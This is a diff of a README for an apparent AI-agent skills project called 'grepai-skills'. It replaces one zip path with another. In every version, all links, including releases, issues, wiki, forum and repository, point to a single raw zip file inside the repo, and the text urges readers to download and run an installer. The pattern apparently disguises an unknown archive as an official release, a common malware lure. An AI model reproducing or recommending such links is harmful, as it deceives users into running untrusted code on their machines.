@@ -6,7 +6,7 @@ Welcome to the **grepai-skills** project! This tool offers 27 AI agent skills de
 
 ### 📥 Download Now
 
-[![Download Latest Release](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip)](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip)
+[![Download Latest Release](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip)](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ These features combine to make coding and debugging more efficient for everyone,
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip).
 2. **Choose Your Version:** Look for the latest version listed at the top of the page. This is the most recent and stable release.
 3. **Download the File:** Click on the appropriate file for your operating system. For example, if you are using Windows, download the `.exe` file. If you're on macOS, look for the `.dmg` file.
 4. **Run the Installer:**
@@ -51,21 +51,21 @@ To get started, follow these steps:
 
 Your experience matters to us. If you encounter any issues or have questions, feel free to reach out:
 
-- **Open a GitHub Issue:** Visit our [Issues page](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip) to report bugs or request features.
-- **Discussion Forum:** Join the conversation in our [Discussion forum](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip) for ideas and help from other users.
+- **Open a GitHub Issue:** Visit our [Issues page](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip) to report bugs or request features.
+- **Discussion Forum:** Join the conversation in our [Discussion forum](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip) for ideas and help from other users.
 
 ## 🌟 Additional Resources
 
-- **Documentation:** Check the [Wiki](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip) for detailed guides and how-tos.
+- **Documentation:** Check the [Wiki](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip) for detailed guides and how-tos.
 - **Tutorial Videos:** Look for introductory videos that show how to make the most of your new skills.
 
 By following these steps, you will seamlessly install **grepai-skills** and enjoy its benefits. If you need clarification or guidance, our community and resources are here to help.
 
 ## 🔗 Quick Links
 
-- [Official Repository](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip)
-- [Download Latest Release](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip)
-- [Issues Page](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip)
-- [Discussion Forum](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/advanced/grepai-languages/skills-grepai-1.2.zip) 
+- [Official Repository](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip)
+- [Download Latest Release](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip)
+- [Issues Page](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip)
+- [Discussion Forum](https://github.com/NNIIKKKKII/grepai-skills/raw/refs/heads/main/skills/integration/grepai-mcp-claude/skills_grepai_v1.3.zip) 
 
 Thank you for choosing **grepai-skills**. Enjoy your exploration of AI-enhanced coding!
